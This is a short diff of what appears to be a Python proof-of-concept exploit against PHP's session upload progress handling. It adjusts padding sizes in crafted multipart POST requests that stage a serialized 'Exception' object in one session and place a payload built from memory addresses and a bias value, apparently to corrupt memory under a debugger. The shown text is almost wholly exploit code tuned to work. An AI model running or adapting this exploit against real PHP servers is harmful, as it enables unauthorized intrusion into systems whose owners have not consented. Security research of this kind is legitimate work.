@@ -53,9 +53,9 @@ def main():
 
     time.sleep(1.5)  # gdb attach + continue
     s = socket.create_connection((HOST, PORT), timeout=30)
-    prod = pb([part(b"f", b"F" * 430080),
+    prod = pb([part(b"f", b"F" * 24576 + b"X" * 8192),
                part(b"PHPSESSID", sid_a.encode()),
-               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
+               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
                part(b"u", b"x" * 10, filename=b"a.txt")])
     r, dt = send(s, post_head(len(prod)), prod, timeout=60)
     body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
@@ -112,7 +112,7 @@ quit
     time.sleep(0.3)
     payload = build_payload(dval, daddr, bias)
     stage(sid_b, b"poc|i:1;" if mode == "benign" else b'poc|O:9:"Exception":0:{}')
-    comb = b"F" * 16384 + payload
+    comb = b"F" * 12288 + payload + b"F" * 4096
     cons = pb([part(b"g", comb),
                part(b"PHPSESSID", sid_b.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
